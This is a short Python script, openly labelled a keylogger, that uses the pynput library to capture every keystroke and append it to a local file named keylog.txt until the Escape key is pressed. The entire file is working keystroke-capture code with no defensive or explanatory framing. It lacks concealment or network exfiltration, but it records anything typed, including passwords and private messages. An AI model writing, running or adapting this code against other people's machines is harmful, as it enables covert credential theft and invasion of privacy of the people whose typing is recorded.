from pynput import keyboard

def on_press(key):
    try:
        with open("keylog.txt", "a") as log_file:
            log_file.write(str(key.char))
    except AttributeError:
        with open("keylog.txt", "a") as log_file:
            log_file.write(f"[{key.name}]")
            
def on_release(key):
    if key == keyboard.Key.esc:
        return False

def start_keylogger():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    print("Keylogger started... Press ESC to stop.")
    start_keylogger()
